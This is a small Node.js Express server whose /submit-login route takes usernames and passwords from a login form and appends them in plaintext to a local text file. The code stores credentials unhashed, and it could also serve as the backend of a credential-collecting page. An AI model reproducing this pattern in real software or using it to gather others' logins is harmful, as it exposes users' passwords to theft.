const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve static files from the "public" directory

// Route to handle login form submission
app.post('/submit-login', (req, res) => {
    const { username, password } = req.body;
    const data = `Username: ${username}, Password: ${password}\n`; // Format the data to save

    // Append data to a text file
    fs.appendFile(path.join(__dirname, 'login_data.txt'), data, (err) => {
        if (err) {
            console.error('Error writing to file', err);
            return res.status(500).send('Error saving data.');
        }
        res.send('Login information saved successfully.');
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});